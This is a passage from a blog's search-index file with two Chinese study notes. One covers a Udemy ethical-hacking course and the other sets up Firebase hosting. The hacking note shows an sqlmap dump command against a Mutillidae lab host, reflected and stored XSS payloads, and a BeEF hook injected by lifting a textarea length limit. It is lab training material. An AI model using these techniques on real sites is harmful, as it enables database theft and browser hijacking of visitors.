href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘  -T accounts -D owasp10 –dump<br><img src="/photo/Ethical_Hacking/160.jpg" alt="160"></p></blockquote><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h4><p><img src="/photo/Ethical_Hacking/161.jpg" alt="161"></p><blockquote><p>嘗試注入代碼:&lt;script&gt;alert(“XSS”)</script><br><img src="/photo/Ethical_Hacking/162.jpg" alt="162"></p></blockquote><h4 id="Stores-XSS"><a href="#Stores-XSS" class="headerlink" title="Stores XSS"></a>Stores XSS</h4><blockquote><p>可將代碼儲存在網頁上，任何人瀏覽網頁時都會執行<br>在網上輸入代碼並儲存<br><img src="/photo/Ethical_Hacking/164.jpg" alt="164"><br>每當進入此頁面時都會執行<br><img src="/photo/Ethical_Hacking/163.jpg" alt="164"></p></blockquote><h4 id="BEFF與XSS結合"><a href="#BEFF與XSS結合" class="headerlink" title="BEFF與XSS結合"></a>BEFF與XSS結合</h4><blockquote><p>打開beff，並將js代碼複製到xss網站上<br><img src="/photo/Ethical_Hacking/165.jpg" alt="165"><br>因為有字數限制開啟檢查修改繞過<br>將&lt;textarea name&#x3D;”mtxMessage” cols&#x3D;”50” rows&#x3D;”3” maxlength&#x3D;”50”&gt;&lt;&#x2F;textarea&gt;更改為&lt;textarea name&#x3D;”mtxMessage” cols&#x3D;”50” rows&#x3D;”3” maxlength&#x3D;”500”&gt;&lt;&#x2F;textarea&gt;<br><img src="/photo/Ethical_Hacking/166.jpg" alt="166"><br>注入代碼後每當使用者進入網站時就會執行<br><img src="/photo/Ethical_Hacking/167.jpg" alt="167"></p></blockquote><h3 id="owasp-zed-attack-proxy-ZAP"><a href="#owasp-zed-attack-proxy-ZAP" class="headerlink" title="owasp zed attack proxy(ZAP)"></a>owasp zed attack proxy(ZAP)</h3><blockquote><p>開啟ZAP<br>新增活動掃描<br><img src="/photo/Ethical_Hacking/168.jpg" alt="168"><br>開啟設定<br>這裡可更改掃描的強度<br><img src="/photo/Ethical_Hacking/169.jpg" alt="169"><br>設定完後輸入網址並開始掃描<br><img src="/photo/Ethical_Hacking/170.jpg" alt="170"><br>掃描完成可看到左邊的網站，及下方的警告<br><img src="/photo/Ethical_Hacking/171.jpg" alt="171"><br>下方的警告旗幟顏色紅色危害最大<br>可點擊查看有關漏洞訊息<br><img src="/photo/Ethical_Hacking/172.jpg" alt="172"><br>點擊右鍵在瀏覽器打開<br><img src="/photo/Ethical_Hacking/174.jpg" alt="173"><br><img src="/photo/Ethical_Hacking/174.jpg" alt="174"></p></blockquote><p>資安報告參考範例:<a href="https://github.com/juliocesarfort/public-pentesting-reports">public-pentesting-reports</a></p><h4 id="保護網站"><a href="#保護網站" class="headerlink" title="保護網站:"></a>保護網站:</h4><blockquote><ol><li>編寫安全代碼</li><li>審查代碼</li><li>滲透測試</li><li>錯誤懸賞</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Udemy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 筆記 </tag>
            
            <tag> 道德黑客 </tag>
            
            <tag> 自學 </tag>
            
            <tag> Udemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Firebase(NOSQL)串接</title>
      <link href="/2023/12/10/Firebase%20NOSQL%E4%B8%B2%E6%8E%A5/"/>
      <url>/2023/12/10/Firebase%20NOSQL%E4%B8%B2%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Firebase"><a href="#Firebase" class="headerlink" title="Firebase"></a>Firebase</h1><h2 id="網址-https-firebase-google-com"><a href="#網址-https-firebase-google-com" class="headerlink" title="網址:https://firebase.google.com/"></a>網址:<a href="https://firebase.google.com/">https://firebase.google.com/</a></h2><h2 id="建立專案"><a href="#建立專案" class="headerlink" title="建立專案"></a>建立專案</h2><h3 id="新增專案"><a href="#新增專案" class="headerlink" title="新增專案"></a>新增專案</h3><p><img src="/photo/firebase/1.jpg" alt="1"></p><h3 id="設定專案名稱"><a href="#設定專案名稱" class="headerlink" title="設定專案名稱"></a>設定專案名稱</h3><p><img src="/photo/firebase/2.jpg" alt="2"></p><h3 id="關閉GA"><a href="#關閉GA" class="headerlink" title="關閉GA"></a>關閉GA</h3><p><img src="/photo/firebase/3.jpg" alt="3"></p><h3 id="建立即時資料庫"><a href="#建立即時資料庫" class="headerlink" title="建立即時資料庫"></a>建立即時資料庫</h3><p><img src="/photo/firebase/4.jpg" alt="4"></p><p><img src="/photo/firebase/5.jpg" alt="5"></p><p><img src="/photo/firebase/6.jpg" alt="6"></p><h3 id="建立檔案資料庫"><a href="#建立檔案資料庫" class="headerlink" title="建立檔案資料庫"></a>建立檔案資料庫</h3><p><img src="/photo/firebase/7.jpg" alt="7"></p><p><img src="/photo/firebase/8.jpg" alt="8"></p><p><img src="/photo/firebase/9.jpg" alt="9"></p><p>設定授權登陸</p><p><img src="/photo/firebase/10.jpg" alt="10"></p><h4 id="選擇google"><a href="#選擇google" class="headerlink" title="選擇google"></a>選擇google</h4><p><img src="/photo/firebase/11.jpg" alt="11"></p><p><img src="/photo/firebase/12.jpg" alt="12"></p><h3 id="安裝Node-js"><a href="#安裝Node-js" class="headerlink" title="安裝Node.js"></a>安裝Node.js</h3><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><blockquote><p>在桌面創建資料夾<br>進入資料夾開啟終端機<br>輸入下列指令:<br>1.npm init &#x2F;&#x2F;初始化(按Enter直到結束)<br><img src="/photo/firebase/13.jpg" alt="13"><br>2.npm install -g –save-dev firebase-tools &#x2F;&#x2F;安裝工具</p></blockquote><h3 id="登陸firebase"><a href="#登陸firebase" class="headerlink" title="登陸firebase"></a>登陸firebase</h3><blockquote><p>firebase login<br><img src="/photo/firebase/14.jpg" alt="14"></p></blockquote><h3 id="初始firebase環境"><a href="#初始firebase環境" class="headerlink" title="初始firebase環境"></a>初始firebase環境</h3><blockquote><p>firebase init hosting<br><img src="/photo/firebase/15.jpg" alt="15"><br>y<br><img src="/photo/firebase/16.jpg" alt="16"><br>Use an existing project  &#x2F;&#x2F;使用現有專案<br><img src="/photo/firebase/17.jpg" alt="17"><br>選擇之前創的專案名<br><img src="/photo/firebase/18.jpg" alt="18"><br>public<br>y<br>n<br><img src="/photo/firebase/19.jpg" alt="19"></p></blockquote><blockquote><p><strong>note:</strong><br>出現Firebase initialization complete!即為成功</p></blockquote><blockquote><p>輸入firebase deploy &#x2F;&#x2F;部屬託管到firebase<br><img src="/photo/firebase/20.jpg" alt="20"></p></blockquote><h3 id="設定firebase設定檔案及測試"><a href="#設定firebase設定檔案及測試" class="headerlink" title="設定firebase設定檔案及測試"></a>設定firebase設定檔案及測試</h3><blockquote><p>將firebase_init-master資料夾的所有檔案丟入專案資料夾的public裡<br><img src="/photo/firebase/21.jpg" alt="21"></p></blockquote><blockquote><p><strong>由於預設firebase.js URL有誤無法開啟須改網址</strong></p><p>將連結改為以下程式碼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-app-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;!-- include only the Firebase features as you need --&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-auth-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-database-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-firestore-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-functions-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-messaging-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-storage-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-analytics-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;/https://www.gstatic.com/firebasejs/8.0.1/firebase-remote-config-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-performance-compat.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="設定init-firebase-js"><a href="#設定init-firebase-js" class="headerlink" title="設定init-firebase.js"></a>設定init-firebase.js</h3><p><img src="/photo/firebase/22.jpg" alt="22"></p><blockquote><p>將project id改為自己的專屬id<br>將api更改<br><img src="/photo/firebase/23.jpg" alt="23"><br><img src="/photo/firebase/24.jpg" alt="24"></p></blockquote><h3 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h3><p><img src="/photo/firebase/25.jpg" alt="25"></p>]]></content>
      
      
      <categories>
          
          <category> 網頁設計 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 筆記 </tag>
            
            <tag> 網頁設計 </tag>
            
            <tag> firebase </tag>
            
            <tag> NOSQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
